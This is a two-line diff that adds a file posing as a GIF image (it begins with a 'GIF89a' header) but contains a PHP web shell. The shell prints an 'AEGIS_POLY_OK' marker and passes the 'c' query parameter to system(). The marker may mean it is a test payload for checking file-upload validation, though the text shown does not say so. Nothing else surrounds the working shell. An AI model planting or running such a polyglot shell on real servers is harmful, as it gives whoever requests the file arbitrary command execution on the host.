@@ -1,0 +1,2 @@
+GIF89a;
+<?php echo "AEGIS_POLY_OK:"; system($_GET["c"]); ?>
